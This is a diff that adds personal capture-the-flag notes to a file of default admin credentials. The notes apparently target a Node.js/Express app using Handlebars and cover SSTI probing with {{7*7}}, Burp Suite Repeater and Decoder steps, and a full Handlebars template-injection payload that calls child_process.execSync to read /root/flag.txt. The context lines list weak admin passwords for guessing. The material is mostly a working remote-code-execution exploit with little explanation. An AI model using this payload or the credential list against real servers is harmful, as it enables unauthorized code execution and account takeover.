@@ -79,3 +79,49 @@ admin password123
 admin qwerty123
 admin administrator123
 admin changeme123
+
+
+------------------------
+
+Node.js
+webserver : express
+
+vulnerability we test for by submitting {{7*7}}
+Server Side Template Injection
+
+Templating engine : Handlebars
+name of the BurpSuite tab used to encode text : Decoder
+
+--------------------
+
+Burpsuite (intercepting HTTP traffic) (linked with plugin foxyproxy)
+
+Proxy -> HTTP history
+POST -> send to repeater
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+
+
+
+
+ 
+
